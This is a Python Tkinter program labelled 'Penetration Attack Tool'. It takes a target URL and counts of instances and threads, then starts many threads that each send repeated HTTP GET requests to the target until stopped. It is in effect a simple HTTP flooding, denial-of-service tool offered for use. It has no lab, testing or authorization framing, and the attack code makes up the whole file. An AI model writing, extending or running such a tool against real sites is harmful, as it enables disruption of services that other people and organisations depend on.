import tkinter as tk
from tkinter import messagebox
from tkinter import ttk
import requests
import threading
import time

# Flag to control the attack threads
stop_attack_flag = threading.Event()

def attack(url):
    while not stop_attack_flag.is_set():
        try:
            response = requests.get(url)
            print(f"Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
        time.sleep(1)  # Add a delay to prevent overwhelming the system

def create_attack_window(url, num_threads):
    window = tk.Toplevel(root)
    window.title("Instance Attack")
    window.geometry("300x150")
    label = ttk.Label(window, text=f"Attacking {url} with {num_threads} threads")
    label.pack(pady=10)
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.start()

def start_attack():
    target_url = url_entry.get()
    if not target_url:
        messagebox.showerror("Input Error", "Please enter a target URL.")
        return
    
    try:
        num_instances = int(instances_entry.get())
        num_threads_per_instance = int(threads_entry.get())
    except ValueError:
        messagebox.showerror("Input Error", "Please enter valid numbers for instances and threads.")
        return

    if num_instances <= 0 or num_threads_per_instance <= 0:
        messagebox.showerror("Input Error", "Number of instances and threads must be greater than 0.")
        return
    
    # Reset the stop flag
    stop_attack_flag.clear()
    
    new_window = new_window_var.get()
    if new_window:
        for i in range(num_instances):
            create_attack_window(target_url, num_threads_per_instance)
    else:
        threads = []
        for i in range(num_instances):
            for j in range(num_threads_per_instance):
                thread = threading.Thread(target=attack, args=(target_url,))
                thread.start()
                threads.append(thread)

    messagebox.showinfo("Attack", f"Penetration attack started with {num_instances} instances and {num_threads_per_instance} threads each!")

def stop_attack():
    # Set the stop flag
    stop_attack_flag.set()
    messagebox.showinfo("Attack", "Penetration attack stopped!")

# Create the main window
root = tk.Tk()
root.title("Penetration Attack Tool")
root.geometry("450x300")
root.resizable(False, False)

# Create a style
style = ttk.Style()
style.configure('TLabel', font=('Helvetica', 10))
style.configure('TEntry', font=('Helvetica', 10))
style.configure('TButton', font=('Helvetica', 10, 'bold'))

# Create and place the URL label and entry
url_label = ttk.Label(root, text="Target URL:")
url_label.grid(column=0, row=0, padx=10, pady=10, sticky='W')
url_entry = ttk.Entry(root, width=40)
url_entry.grid(column=1, row=0, padx=10, pady=10)

# Create and place the instances label and entry
instances_label = ttk.Label(root, text="Number of Instances:")
instances_label.grid(column=0, row=1, padx=10, pady=10, sticky='W')
instances_entry = ttk.Entry(root, width=10)
instances_entry.grid(column=1, row=1, padx=10, pady=10)
instances_entry.insert(0, "1")  # Default value

# Create and place the threads label and entry
threads_label = ttk.Label(root, text="Threads per Instance:")
threads_label.grid(column=0, row=2, padx=10, pady=10, sticky='W')
threads_entry = ttk.Entry(root, width=10)
threads_entry.grid(column=1, row=2, padx=10, pady=10)
threads_entry.insert(0, "5")  # Default value

# Create and place the checkbox for new window option
new_window_var = tk.BooleanVar()
new_window_check = ttk.Checkbutton(root, text="Each instance in new window?", variable=new_window_var)
new_window_check.grid(column=0, row=3, padx=10, pady=10, sticky='W')

# Create and place the start and stop buttons
start_button = ttk.Button(root, text="Start Attack", command=start_attack)
start_button.grid(column=1, row=4, padx=10, pady=20, sticky='E')

stop_button = ttk.Button(root, text="Stop Attack", command=stop_attack)
stop_button.grid(column=0, row=4, padx=10, pady=20, sticky='W')

# Start the Tkinter event loop
root.mainloop()
